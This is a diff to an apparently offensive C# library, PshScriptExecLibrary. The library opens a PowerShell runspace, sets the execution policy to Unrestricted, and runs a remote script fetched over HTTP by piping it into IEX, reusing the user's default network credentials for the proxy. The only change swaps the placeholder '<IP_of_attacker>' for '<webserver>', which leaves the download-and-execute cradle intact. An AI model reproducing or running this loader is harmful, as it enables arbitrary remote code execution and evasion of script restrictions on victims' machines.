@@ -34,7 +34,7 @@ namespace PshScriptExecLibrary {
                r.Open();
                RunspaceInvoke s = new RunspaceInvoke(r);
                s.Invoke("Set-ExecutionPolicy Unrestricted -Scope CurrentUser");
-               s.Invoke("(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<IP_of_attacker>/<path_to_script>.ps1')|IEX");
+               s.Invoke("(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<webserver>/<path_to_script>.ps1')|IEX");
                r.Close();
            }
     
